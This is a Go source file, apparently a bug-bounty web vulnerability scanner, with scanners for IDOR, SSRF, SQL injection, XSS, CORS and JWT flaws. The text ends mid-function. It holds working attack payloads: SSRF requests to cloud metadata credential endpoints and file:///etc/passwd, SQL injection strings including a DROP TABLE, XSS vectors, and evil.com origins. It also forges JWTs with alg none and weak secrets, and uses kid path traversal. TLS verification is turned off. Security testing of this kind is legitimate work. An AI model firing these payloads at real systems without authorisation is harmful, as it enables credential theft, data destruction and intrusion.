package main

import (
    "bufio"
    "bytes"
    "context"
    "crypto/tls"
    "encoding/base64"
    "encoding/csv"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "regexp"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "github.com/dgrijalva/jwt-go"
    "github.com/fatih/color"
    "github.com/google/uuid"
    "github.com/schollz/progressbar/v3"
    "golang.org/x/time/rate"
    "gopkg.in/yaml.v3"
)

// ========== CONFIGURATION ==========
type Config struct {
    TargetURL      string            `yaml:"target_url" json:"target_url"`
    AuthToken      string            `yaml:"auth_token" json:"auth_token"`
    ClientID       string            `yaml:"client_id" json:"client_id"`
    ClientSecret   string            `yaml:"client_secret" json:"client_secret"`
    RedirectURI    string            `yaml:"redirect_uri" json:"redirect_uri"`
    RateLimit      float64           `yaml:"rate_limit" json:"rate_limit"`
    Timeout        int               `yaml:"timeout" json:"timeout"`
    MaxWorkers     int               `yaml:"max_workers" json:"max_workers"`
    Cookies        map[string]string `yaml:"cookies" json:"cookies"`
    Headers        map[string]string `yaml:"headers" json:"headers"`
    Proxies        []string          `yaml:"proxies" json:"proxies"`
    OutputDir      string            `yaml:"output_dir" json:"output_dir"`
    Verbose        bool              `yaml:"verbose" json:"verbose"`
    FollowRedirect bool              `yaml:"follow_redirect" json:"follow_redirect"`
    MaxRedirects   int               `yaml:"max_redirects" json:"max_redirects"`
}

var DefaultConfig = Config{
    RedirectURI:    "http://localhost:8080",
    RateLimit:      0.5,
    Timeout:        15,
    MaxWorkers:     10,
    OutputDir:      "reports",
    FollowRedirect: true,
    MaxRedirects:   10,
}

// ========== RESULT STRUCTURES ==========
type Vulnerability struct {
    ID              string                 `json:"id"`
    Timestamp       time.Time              `json:"timestamp"`
    Type            string                 `json:"type"`
    Name            string                 `json:"name"`
    URL             string                 `json:"url"`
    Method          string                 `json:"method"`
    StatusCode      int                    `json:"status_code"`
    Severity        string                 `json:"severity"`
    Confidence      string                 `json:"confidence"`
    Description     string                 `json:"description"`
    Remediation     string                 `json:"remediation"`
    Evidence        string                 `json:"evidence"`
    Payload         string                  `json:"payload"`
    RequestHeaders  map[string]string      `json:"request_headers"`
    ResponseHeaders map[string]string      `json:"response_headers"`
    ResponseTime    time.Duration           `json:"response_time"`
    DataExposed     map[string]interface{} `json:"data_exposed,omitempty"`
    CWE             string                  `json:"cwe"`
    CVSS            float64                 `json:"cvss"`
}

type ScanResult struct {
    Target          string          `json:"target"`
    StartTime       time.Time       `json:"start_time"`
    EndTime         time.Time       `json:"end_time"`
    Duration        string          `json:"duration"`
    TotalRequests   int64           `json:"total_requests"`
    Vulnerabilities []Vulnerability `json:"vulnerabilities"`
    Errors          []string        `json:"errors"`
    Stats           map[string]interface{} `json:"stats"`
}

// ========== REQUEST QUEUE ==========
type Request struct {
    ID        string
    URL       string
    Method    string
    Headers   map[string]string
    Body      []byte
    Cookies   []*http.Cookie
    Priority  int
    Timeout   time.Duration
    Retries   int
    MaxRetries int
}

type RequestQueue struct {
    queue   chan *Request
    mu      sync.Mutex
    stats   RequestStats
}

type RequestStats struct {
    Total      int64
    Completed  int64
    Failed     int64
    Retried    int64
    AvgTime    time.Duration
}

func NewRequestQueue(size int) *RequestQueue {
    return &RequestQueue{
        queue: make(chan *Request, size),
    }
}

// ========== RATE LIMITER ==========
type RateLimiter struct {
    limiters map[string]*rate.Limiter
    mu       sync.RWMutex
    rate     float64
    burst    int
}

func NewRateLimiter(r float64, b int) *RateLimiter {
    return &RateLimiter{
        limiters: make(map[string]*rate.Limiter),
        rate:     r,
        burst:    b,
    }
}

func (rl *RateLimiter) Wait(ctx context.Context, key string) error {
    rl.mu.RLock()
    limiter, ok := rl.limiters[key]
    rl.mu.RUnlock()

    if !ok {
        rl.mu.Lock()
        limiter = rate.NewLimiter(rate.Limit(rl.rate), rl.burst)
        rl.limiters[key] = limiter
        rl.mu.Unlock()
    }

    return limiter.Wait(ctx)
}

// ========== CACHE SYSTEM ==========
type CacheEntry struct {
    Response   *http.Response
    Body       []byte
    Timestamp  time.Time
    Hits       int64
}

type Cache struct {
    entries map[string]*CacheEntry
    mu      sync.RWMutex
    maxSize int
    ttl     time.Duration
    hits    int64
    misses  int64
}

func NewCache(maxSize int, ttl time.Duration) *Cache {
    return &Cache{
        entries: make(map[string]*CacheEntry),
        maxSize: maxSize,
        ttl:     ttl,
    }
}

func (c *Cache) Get(key string) (*http.Response, []byte, bool) {
    c.mu.RLock()
    entry, ok := c.entries[key]
    c.mu.RUnlock()

    if !ok {
        atomic.AddInt64(&c.misses, 1)
        return nil, nil, false
    }

    if time.Since(entry.Timestamp) > c.ttl {
        c.Delete(key)
        atomic.AddInt64(&c.misses, 1)
        return nil, nil, false
    }

    atomic.AddInt64(&entry.Hits, 1)
    atomic.AddInt64(&c.hits, 1)
    return entry.Response, entry.Body, true
}

func (c *Cache) Set(key string, resp *http.Response, body []byte) {
    if len(c.entries) >= c.maxSize {
        c.evictOldest()
    }

    c.mu.Lock()
    defer c.mu.Unlock()
    c.entries[key] = &CacheEntry{
        Response:  resp,
        Body:      body,
        Timestamp: time.Now(),
    }
}

func (c *Cache) Delete(key string) {
    c.mu.Lock()
    defer c.mu.Unlock()
    delete(c.entries, key)
}

func (c *Cache) evictOldest() {
    var oldestKey string
    var oldestTime time.Time

    c.mu.RLock()
    for k, v := range c.entries {
        if oldestTime.IsZero() || v.Timestamp.Before(oldestTime) {
            oldestKey = k
            oldestTime = v.Timestamp
        }
    }
    c.mu.RUnlock()

    if oldestKey != "" {
        c.Delete(oldestKey)
    }
}

// ========== HTTP CLIENT POOL ==========
type HTTPClient struct {
    client  *http.Client
    limiter *RateLimiter
    cache   *Cache
    stats   ClientStats
}

type ClientStats struct {
    Requests   int64
    BytesIn    int64
    BytesOut   int64
    Errors     int64
    CacheHits  int64
    CacheMiss  int64
}

type ClientPool struct {
    clients []*HTTPClient
    index   uint64
    mu      sync.Mutex
}

func NewClientPool(size int, config Config) *ClientPool {
    pool := &ClientPool{
        clients: make([]*HTTPClient, size),
    }

    for i := 0; i < size; i++ {
        pool.clients[i] = &HTTPClient{
            client:  createHTTPClient(config),
            limiter: NewRateLimiter(config.RateLimit, 5),
            cache:   NewCache(1000, 5*time.Minute),
        }
    }

    return pool
}

func createHTTPClient(config Config) *http.Client {
    transport := &http.Transport{
        MaxIdleConns:        100,
        MaxIdleConnsPerHost: 10,
        IdleConnTimeout:     90 * time.Second,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
        DisableCompression: false,
    }

    // Setup proxies if any
    if len(config.Proxies) > 0 {
        proxyURL, _ := url.Parse(config.Proxies[0])
        transport.Proxy = http.ProxyURL(proxyURL)
    }

    return &http.Client{
        Transport: transport,
        Timeout:   time.Duration(config.Timeout) * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if !config.FollowRedirect {
                return http.ErrUseLastResponse
            }
            if len(via) >= config.MaxRedirects {
                return fmt.Errorf("too many redirects")
            }
            return nil
        },
    }
}

// ========== GOOGLE OAUTH ==========
type GoogleOAuth struct {
    clientID     string
    clientSecret string
    redirectURI  string
    tokenURL     string
    authURL      string
}

func NewGoogleOAuth(clientID, clientSecret, redirectURI string) *GoogleOAuth {
    return &GoogleOAuth{
        clientID:     clientID,
        clientSecret: clientSecret,
        redirectURI:  redirectURI,
        tokenURL:     "https://oauth2.googleapis.com/token",
        authURL:      "https://accounts.google.com/o/oauth2/v2/auth",
    }
}

func (g *GoogleOAuth) GetAuthURL(state string) string {
    return fmt.Sprintf("%s?client_id=%s&redirect_uri=%s&response_type=code&scope=email%%20profile&state=%s",
        g.authURL, g.clientID, url.QueryEscape(g.redirectURI), state)
}

func (g *GoogleOAuth) Exchange(ctx context.Context, code string) (string, error) {
    data := url.Values{}
    data.Set("code", code)
    data.Set("client_id", g.clientID)
    data.Set("client_secret", g.clientSecret)
    data.Set("redirect_uri", g.redirectURI)
    data.Set("grant_type", "authorization_code")

    req, err := http.NewRequestWithContext(ctx, "POST", g.tokenURL, strings.NewReader(data.Encode()))
    if err != nil {
        return "", err
    }
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    client := &http.Client{Timeout: 10 * time.Second}
    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    var result map[string]interface{}
    if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
        return "", err
    }

    token, ok := result["access_token"].(string)
    if !ok {
        return "", fmt.Errorf("no access token in response")
    }

    return token, nil
}

// ========== IDOR SCANNER ==========
type IDORScanner struct {
    clientPool *ClientPool
    config     Config
    results    chan Vulnerability
    wg         sync.WaitGroup
}

func NewIDORScanner(clientPool *ClientPool, config Config) *IDORScanner {
    return &IDORScanner{
        clientPool: clientPool,
        config:     config,
        results:    make(chan Vulnerability, 1000),
    }
}

func (s *IDORScanner) Scan(ctx context.Context, endpointPattern string, userIDs []string, methods []string) <-chan Vulnerability {
    if methods == nil || len(methods) == 0 {
        methods = []string{"GET", "POST", "PUT", "DELETE"}
    }

    // Test cases untuk IDOR
    testCases := []struct {
        name     string
        auth     bool
        expected int
        modify   func(string) string
    }{
        {"no_auth", false, 401, func(id string) string { return id }},
        {"other_user", true, 403, func(id string) string { return id }},
        {"unauthorized_access", true, 200, func(id string) string { return id }},
    }

    for _, method := range methods {
        for _, userID := range userIDs {
            for _, tc := range testCases {
                s.wg.Add(1)
                go func(method, userID string, tc struct {
                    name     string
                    auth     bool
                    expected int
                    modify   func(string) string
                }) {
                    defer s.wg.Done()

                    url := strings.ReplaceAll(endpointPattern, "{id}", tc.modify(userID))
                    url = strings.ReplaceAll(url, "{user_id}", tc.modify(userID))

                    headers := make(map[string]string)
                    if tc.auth && s.config.AuthToken != "" {
                        headers["Authorization"] = "Bearer " + s.config.AuthToken
                    }

                    idx := atomic.AddUint64(&s.clientPool.index, 1) % uint64(len(s.clientPool.clients))
                    client := s.clientPool.clients[idx]
                    
                    req := &Request{
                        ID:       uuid.New().String(),
                        URL:      url,
                        Method:   method,
                        Headers:  headers,
                        Priority: 1,
                        MaxRetries: 2,
                    }

                    // Send request
                    resp, body, err := s.doRequest(ctx, client, req)
                    if err != nil {
                        return
                    }

                    // Analyze for IDOR
                    vuln := s.analyze(resp, body, req, tc)
                    if vuln != nil {
                        s.results <- *vuln
                    }
                }(method, userID, tc)
            }
        }
    }

    go func() {
        s.wg.Wait()
        close(s.results)
    }()

    return s.results
}

func (s *IDORScanner) doRequest(ctx context.Context, client *HTTPClient, req *Request) (*http.Response, []byte, error) {
    // Rate limiting
    client.limiter.Wait(ctx, req.URL)

    // Check cache
    cacheKey := fmt.Sprintf("%s:%s", req.Method, req.URL)
    if cachedResp, cachedBody, ok := client.cache.Get(cacheKey); ok {
        atomic.AddInt64(&client.stats.CacheHits, 1)
        return cachedResp, cachedBody, nil
    }

    // Create request
    httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, bytes.NewReader(req.Body))
    if err != nil {
        atomic.AddInt64(&client.stats.Errors, 1)
        return nil, nil, err
    }

    // Add headers
    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }
    httpReq.Header.Set("User-Agent", "GoBounty/1.0")
    httpReq.Header.Set("Accept", "application/json, text/html")

    // Add cookies
    for _, cookie := range req.Cookies {
        httpReq.AddCookie(cookie)
    }

    // Send request with retries
    var resp *http.Response
    var body []byte
    
    for attempt := 0; attempt <= req.MaxRetries; attempt++ {
        start := time.Now()
        resp, err = client.client.Do(httpReq)
        
        if err == nil {
            body, err = io.ReadAll(resp.Body)
            resp.Body.Close()
            
            if err == nil {
                atomic.AddInt64(&client.stats.Requests, 1)
                atomic.AddInt64(&client.stats.BytesIn, int64(len(body)))
                
                // Cache response
                client.cache.Set(cacheKey, resp, body)
                break
            }
        }

        atomic.AddInt64(&client.stats.Errors, 1)
        _ = start // Use start to avoid unused variable warning
        if attempt < req.MaxRetries {
            time.Sleep(time.Duration(attempt+1) * time.Second)
            continue
        }
    }

    return resp, body, err
}

func (s *IDORScanner) analyze(resp *http.Response, body []byte, req *Request, tc struct {
    name     string
    auth     bool
    expected int
    modify   func(string) string
}) *Vulnerability {
    // Check if response indicates IDOR
    if resp.StatusCode == 200 {
        // Look for sensitive data patterns
        sensitivePatterns := []string{
            `"email":\s*"[^@]+@[^"]+"`,
            `"phone":\s*"\d+"`,
            `"ssn":\s*"\d{3}-\d{2}-\d{4}"`,
            `"credit_card":\s*"\d{16}"`,
            `"password":\s*"[^"]+"`,
            `"token":\s*"[^"]+"`,
            `"api_key":\s*"[^"]+"`,
        }

        bodyStr := string(body)
        for _, pattern := range sensitivePatterns {
            if matched, _ := regexp.MatchString(pattern, bodyStr); matched {
                return &Vulnerability{
                    ID:         uuid.New().String(),
                    Timestamp:  time.Now(),
                    Type:       "IDOR",
                    Name:       "Insecure Direct Object Reference",
                    URL:        req.URL,
                    Method:     req.Method,
                    StatusCode: resp.StatusCode,
                    Severity:   "High",
                    Confidence: "High",
                    Description: "The application exposes sensitive data belonging to other users by directly referencing objects.",
                    Remediation: "Implement proper access control checks. Use indirect references instead of direct IDs.",
                    Evidence:   bodyStr[:min(500, len(bodyStr))],
                    CWE:        "CWE-639",
                    CVSS:       7.5,
                }
            }
        }
    }

    return nil
}

// ========== SSRF SCANNER ==========
type SSRFScanner struct {
    clientPool *ClientPool
    config     Config
}

type CallbackServer struct {
    server   *http.Server
    requests chan string
    port     int
}

func NewCallbackServer(port int) *CallbackServer {
    cs := &CallbackServer{
        requests: make(chan string, 100),
        port:     port,
    }

    mux := http.NewServeMux()
    mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        cs.requests <- fmt.Sprintf("%s - %s", r.RemoteAddr, r.URL.Path)
        w.WriteHeader(200)
    })

    cs.server = &http.Server{
        Addr:    fmt.Sprintf(":%d", port),
        Handler: mux,
    }

    return cs
}

func (s *SSRFScanner) Scan(ctx context.Context, param string) <-chan Vulnerability {
    results := make(chan Vulnerability, 100)

    // Start callback server untuk blind SSRF
    callbackPort := 8081
    callbackServer := NewCallbackServer(callbackPort)
    go func() {
        callbackServer.server.ListenAndServe()
    }()
    
    // Cleanup when done
    go func() {
        <-ctx.Done()
        callbackServer.server.Close()
    }()

    // Payloads untuk SSRF
    payloads := []string{
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://localhost:80",
        "http://localhost:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:5432",
        "http://[::1]:80",
        "file:///etc/passwd",
        "gopher://localhost:80/_GET / HTTP/1.0",
        "dict://localhost:11211/",
        fmt.Sprintf("http://%s:%d/ssrf", s.getLocalIP(), callbackPort),
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    }

    go func() {
        for _, payload := range payloads {
            select {
            case <-ctx.Done():
                close(results)
                return
            default:
            }

            // Inject payload ke URL
            targetURL := injectPayload(s.config.TargetURL, param, payload)

            idx := atomic.AddUint64(&s.clientPool.index, 1) % uint64(len(s.clientPool.clients))
            client := s.clientPool.clients[idx]
            
            req := &Request{
                URL:     targetURL,
                Method:  "GET",
                Headers: map[string]string{},
                MaxRetries: 1,
            }

            resp, body, err := s.doRequest(ctx, client, req)
            if err != nil {
                continue
            }

            // Analyze response
            if vuln := s.analyze(resp, body, payload); vuln != nil {
                results <- *vuln
            }

            // Check callback server for blind SSRF
            select {
            case callback := <-callbackServer.requests:
                results <- Vulnerability{
                    ID:         uuid.New().String(),
                    Timestamp:  time.Now(),
                    Type:       "SSRF",
                    Name:       "Blind Server-Side Request Forgery",
                    URL:        targetURL,
                    Method:     "GET",
                    StatusCode: resp.StatusCode,
                    Severity:   "High",
                    Confidence: "High",
                    Description: "The application made a request to our callback server, confirming SSRF.",
                    Evidence:   callback,
                    Payload:    payload,
                    CWE:        "CWE-918",
                    CVSS:       8.6,
                }
            default:
            }

            time.Sleep(time.Duration(s.config.RateLimit) * time.Second)
        }

        close(results)
    }()

    return results
}

func (s *SSRFScanner) doRequest(ctx context.Context, client *HTTPClient, req *Request) (*http.Response, []byte, error) {
    httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, nil)
    if err != nil {
        return nil, nil, err
    }

    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }

    resp, err := client.client.Do(httpReq)
    if err != nil {
        return nil, nil, err
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    return resp, body, err
}

func (s *SSRFScanner) analyze(resp *http.Response, body []byte, payload string) *Vulnerability {
    // Check for cloud metadata in response
    cloudIndicators := []string{
        "ami-id", "instance-id", "public-keys",
        "iam", "security-credentials", "meta-data",
        "root:", "daemon:", "bin:", "sys:",
    }

    bodyStr := string(body)
    for _, indicator := range cloudIndicators {
        if strings.Contains(bodyStr, indicator) {
            return &Vulnerability{
                ID:         uuid.New().String(),
                Timestamp:  time.Now(),
                Type:       "SSRF",
                Name:       "Server-Side Request Forgery",
                URL:        resp.Request.URL.String(),
                Method:     "GET",
                StatusCode: resp.StatusCode,
                Severity:   "Critical",
                Confidence: "High",
                Description: "The application allows requests to internal/cloud metadata endpoints.",
                Evidence:   bodyStr[:min(500, len(bodyStr))],
                Payload:    payload,
                CWE:        "CWE-918",
                CVSS:       9.1,
            }
        }
    }

    // Check for internal IPs/domains in response
    ipPattern := `(10\.\d{1,3}\.\d{1,3}\.\d{1,3})|(172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3})|(192\.168\.\d{1,3}\.\d{1,3})|(127\.\d{1,3}\.\d{1,3}\.\d{1,3})`
    if matched, _ := regexp.MatchString(ipPattern, bodyStr); matched {
        return &Vulnerability{
            ID:         uuid.New().String(),
            Timestamp:  time.Now(),
            Type:       "SSRF",
            Name:       "Internal Network Discovery via SSRF",
            URL:        resp.Request.URL.String(),
            Method:     "GET",
            StatusCode: resp.StatusCode,
            Severity:   "High",
            Confidence: "Medium",
            Description: "The response contains internal IP addresses, suggesting SSRF.",
            Evidence:   bodyStr[:min(500, len(bodyStr))],
            Payload:    payload,
            CWE:        "CWE-918",
            CVSS:       7.5,
        }
    }

    return nil
}

func (s *SSRFScanner) getLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "127.0.0.1"
    }

    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String()
            }
        }
    }

    return "127.0.0.1"
}

// ========== SQL INJECTION SCANNER ==========
type SQLInjectionScanner struct {
    clientPool *ClientPool
    config     Config
    timeBased  bool
}

func (s *SQLInjectionScanner) Scan(ctx context.Context, param string) <-chan Vulnerability {
    results := make(chan Vulnerability, 100)

    payloads := []struct {
        name    string
        payload string
        check   func(*http.Response, []byte, time.Duration) bool
    }{
        {
            name:    "Error-based",
            payload: "' OR '1'='1",
            check:   s.checkErrorBased,
        },
        {
            name:    "Union-based",
            payload: "' UNION SELECT NULL--",
            check:   s.checkUnionBased,
        },
        {
            name:    "Boolean-based",
            payload: "' AND '1'='1",
            check:   s.checkBooleanBased,
        },
        {
            name:    "Time-based (5s)",
            payload: "1' AND SLEEP(5)--",
            check:   s.checkTimeBased,
        },
        {
            name:    "Stacked queries",
            payload: "1'; DROP TABLE users--",
            check:   s.checkErrorBased,
        },
        {
            name:    "Comment injection",
            payload: "admin'--",
            check:   s.checkErrorBased,
        },
    }

    go func() {
        for _, p := range payloads {
            select {
            case <-ctx.Done():
                close(results)
                return
            default:
            }

            targetURL := injectPayload(s.config.TargetURL, param, p.payload)

            idx := atomic.AddUint64(&s.clientPool.index, 1) % uint64(len(s.clientPool.clients))
            client := s.clientPool.clients[idx]
            
            start := time.Now()
            
            req := &Request{
                URL:    targetURL,
                Method: "GET",
                MaxRetries: 1,
            }

            resp, body, err := s.doRequest(ctx, client, req)
            if err != nil {
                continue
            }

            responseTime := time.Since(start)

            if p.check(resp, body, responseTime) {
                results <- Vulnerability{
                    ID:         uuid.New().String(),
                    Timestamp:  time.Now(),
                    Type:       "SQL Injection",
                    Name:       p.name + " SQL Injection",
                    URL:        targetURL,
                    Method:     "GET",
                    StatusCode: resp.StatusCode,
                    Severity:   "Critical",
                    Confidence: "High",
                    Description: fmt.Sprintf("The application is vulnerable to %s SQL injection.", p.name),
                    Remediation: "Use parameterized queries/prepared statements. Implement input validation.",
                    Evidence:   string(body)[:min(500, len(body))],
                    Payload:    p.payload,
                    CWE:        "CWE-89",
                    CVSS:       9.8,
                }
            }

            time.Sleep(time.Duration(s.config.RateLimit) * time.Second)
        }

        close(results)
    }()

    return results
}

func (s *SQLInjectionScanner) doRequest(ctx context.Context, client *HTTPClient, req *Request) (*http.Response, []byte, error) {
    httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, nil)
    if err != nil {
        return nil, nil, err
    }

    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }

    resp, err := client.client.Do(httpReq)
    if err != nil {
        return nil, nil, err
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    return resp, body, err
}

func (s *SQLInjectionScanner) checkErrorBased(resp *http.Response, body []byte, _ time.Duration) bool {
    sqlErrors := []string{
        "sql syntax",
        "mysql_fetch",
        "ora-",
        "postgresql",
        "sqlite",
        "syntax error",
        "unclosed quotation",
        "unknown column",
        "mysql error",
        "warning: mysql",
        "driver error",
        "odbc",
        "db2",
    }

    bodyStr := strings.ToLower(string(body))
    for _, err := range sqlErrors {
        if strings.Contains(bodyStr, err) {
            return true
        }
    }

    return false
}

func (s *SQLInjectionScanner) checkUnionBased(resp *http.Response, body []byte, _ time.Duration) bool {
    // Check for column count mismatch errors
    unionErrors := []string{
        "the used select statements have a different number of columns",
        "union",
        "column count",
    }

    bodyStr := strings.ToLower(string(body))
    for _, err := range unionErrors {
        if strings.Contains(bodyStr, err) {
            return true
        }
    }

    return false
}

func (s *SQLInjectionScanner) checkBooleanBased(resp *http.Response, body []byte, _ time.Duration) bool {
    // Compare with baseline
    baselineURL := s.config.TargetURL
    baselineClient := s.clientPool.clients[0]
    baselineResp, baselineBody, _ := s.doRequest(context.Background(), baselineClient, &Request{URL: baselineURL, Method: "GET", MaxRetries: 1})
    
    if baselineResp == nil {
        return false
    }

    // Significant difference in response length might indicate boolean-based injection
    diff := float64(len(body)-len(baselineBody)) / float64(len(baselineBody))
    return diff > 0.5 || diff < -0.5
}

func (s *SQLInjectionScanner) checkTimeBased(resp *http.Response, body []byte, responseTime time.Duration) bool {
    return responseTime > 5*time.Second
}

// ========== XSS SCANNER ==========
type XSSScanner struct {
    clientPool *ClientPool
    config     Config
}

func (s *XSSScanner) Scan(ctx context.Context, param string) <-chan Vulnerability {
    results := make(chan Vulnerability, 100)

    payloads := []string{
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\" onmouseover=\"alert(1)\"",
        "'-alert(1)-'",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
    }

    go func() {
        for _, payload := range payloads {
            select {
            case <-ctx.Done():
                close(results)
                return
            default:
            }

            targetURL := injectPayload(s.config.TargetURL, param, payload)

            idx := atomic.AddUint64(&s.clientPool.index, 1) % uint64(len(s.clientPool.clients))
            client := s.clientPool.clients[idx]
            
            req := &Request{
                URL:    targetURL,
                Method: "GET",
                MaxRetries: 1,
            }

            resp, body, err := s.doRequest(ctx, client, req)
            if err != nil {
                continue
            }

            // Check if payload is reflected
            if strings.Contains(string(body), payload) {
                results <- Vulnerability{
                    ID:         uuid.New().String(),
                    Timestamp:  time.Now(),
                    Type:       "XSS",
                    Name:       "Reflected Cross-Site Scripting",
                    URL:        targetURL,
                    Method:     "GET",
                    StatusCode: resp.StatusCode,
                    Severity:   "Medium",
                    Confidence: "High",
                    Description: "The application reflects user input without proper sanitization.",
                    Remediation: "Implement proper output encoding. Use Content-Security-Policy headers.",
                    Evidence:   string(body)[:min(500, len(body))],
                    Payload:    payload,
                    CWE:        "CWE-79",
                    CVSS:       6.1,
                }
            }

            time.Sleep(time.Duration(s.config.RateLimit) * time.Second)
        }

        close(results)
    }()

    return results
}

func (s *XSSScanner) doRequest(ctx context.Context, client *HTTPClient, req *Request) (*http.Response, []byte, error) {
    httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, nil)
    if err != nil {
        return nil, nil, err
    }

    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }

    resp, err := client.client.Do(httpReq)
    if err != nil {
        return nil, nil, err
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    return resp, body, err
}

// ========== CORS SCANNER ==========
type CORSScanner struct {
    clientPool *ClientPool
    config     Config
}

func (s *CORSScanner) Scan(ctx context.Context) <-chan Vulnerability {
    results := make(chan Vulnerability, 100)

    origins := []string{
        "https://evil.com",
        "http://localhost",
        "null",
        "https://attacker.com",
        "http://" + extractDomain(s.config.TargetURL) + ".evil.com",
        "https://" + extractDomain(s.config.TargetURL) + ".evil.com",
        "file://",
        "chrome-extension://",
    }

    go func() {
        for _, origin := range origins {
            select {
            case <-ctx.Done():
                close(results)
                return
            default:
            }

            idx := atomic.AddUint64(&s.clientPool.index, 1) % uint64(len(s.clientPool.clients))
            client := s.clientPool.clients[idx]
            
            req := &Request{
                URL:    s.config.TargetURL,
                Method: "GET",
                Headers: map[string]string{
                    "Origin": origin,
                },
                MaxRetries: 1,
            }

            resp, _, err := s.doRequest(ctx, client, req)
            if err != nil {
                continue
            }

            // Check CORS headers
            acao := resp.Header.Get("Access-Control-Allow-Origin")
            acac := resp.Header.Get("Access-Control-Allow-Credentials")

            if acao == "*" || acao == origin {
                if acac == "true" {
                    results <- Vulnerability{
                        ID:         uuid.New().String(),
                        Timestamp:  time.Now(),
                        Type:       "CORS Misconfiguration",
                        Name:       "Dangerous CORS Configuration",
                        URL:        s.config.TargetURL,
                        Method:     "GET",
                        StatusCode: resp.StatusCode,
                        Severity:   "High",
                        Confidence: "High",
                        Description: fmt.Sprintf("The application allows CORS from %s with credentials.", origin),
                        Remediation: "Restrict CORS to trusted origins. Avoid using wildcards with credentials.",
                        Evidence:   fmt.Sprintf("ACAO: %s, ACAC: %s", acao, acac),
                        CWE:        "CWE-942",
                        CVSS:       7.5,
                    }
                }
            }

            time.Sleep(time.Duration(s.config.RateLimit) * time.Second)
        }

        close(results)
    }()

    return results
}

func (s *CORSScanner) doRequest(ctx context.Context, client *HTTPClient, req *Request) (*http.Response, []byte, error) {
    httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, nil)
    if err != nil {
        return nil, nil, err
    }

    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }

    resp, err := client.client.Do(httpReq)
    if err != nil {
        return nil, nil, err
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    return resp, body, err
}

// ========== JWT SCANNER ==========
type JWTScanner struct {
    clientPool *ClientPool
    config     Config
}

func (s *JWTScanner) Scan(ctx context.Context, token string) <-chan Vulnerability {
    results := make(chan Vulnerability, 100)

    tests := []struct {
        name    string
        modify  func(string) string
        check   func(*http.Response) bool
    }{
        {
            name: "None Algorithm",
            modify: func(t string) string {
                parts := strings.Split(t, ".")
                if len(parts) != 3 {
                    return t
                }

                // Change alg to none
                header, _ := base64.RawURLEncoding.DecodeString(parts[0])
                var headerJSON map[string]interface{}
                json.Unmarshal(header, &headerJSON)
                headerJSON["alg"] = "none"
                newHeader, _ := json.Marshal(headerJSON)
                newHeaderB64 := base64.RawURLEncoding.EncodeToString(newHeader)

                return fmt.Sprintf("%s..%s", newHeaderB64, parts[2])
            },
            check: func(resp *http.Response) bool {
                return resp.StatusCode == 200
            },
        },
        {
            name: "Empty Secret",
            modify: func(t string) string {
                token, _ := jwt.Parse(t, func(token *jwt.Token) (interface{}, error) {
                    return []byte(""), nil
                })
                if token == nil {
                    return t
                }

                newToken, _ := token.SignedString([]byte(""))
                return newToken
            },
            check: func(resp *http.Response) bool {
                return resp.StatusCode == 200
            },
        },
        {
            name: "Weak Secret",
            modify: func(t string) string {
                commonSecrets := []string{"secret", "password", "admin", "key", "jwt"}
                
                for _, secret := range commonSecrets {
                    token, _ := jwt.Parse(t, func(token *jwt.Token) (interface{}, error) {
                        return []byte(secret), nil
                    })
                    if token != nil && token.Valid {
                        newToken, _ := token.SignedString([]byte(secret))
                        return newToken
                    }
                }
                return t
            },
            check: func(resp *http.Response) bool {
                return resp.StatusCode == 200
            },
        },
        {
            name: "KID Injection",
            modify: func(t string) string {
                parts := strings.Split(t, ".")
                if len(parts) != 3 {
                    return t
                }

                header, _ := base64.RawURLEncoding.DecodeString(parts[0])
                var headerJSON map[string]interface{}
                json.Unmarshal(header, &headerJSON)
                headerJSON["kid"] = "../../../etc/passwd"
                newHeader, _ := json.Marshal(headerJSON)
                newHeaderB64 := base64.RawURLEncoding.EncodeToString(newHeader)

                return fmt.Sprintf("%s.%s.%s", newHeaderB64, parts[1], parts[2])
            },
            check: func(resp *http.Response) bool {
                // Check for file inclusion errors
                return strings.Contains(resp.Header.Get("WWW-Authenticate"), "error")
            },
        },
    }

    go func() {
        for _, test := range tests {
            select {
            case <-ctx.Done():
                close(results)
                return
            default:
            }

            modifiedToken := test.modify(token)
            
            idx := atomic.AddUint64(&s.clientPool.index, 1) % uint64(len(s.clientPool.clients))
            client := s.clientPool.clients[idx]
            
            req := &Request{
                URL:    s.config.TargetURL,
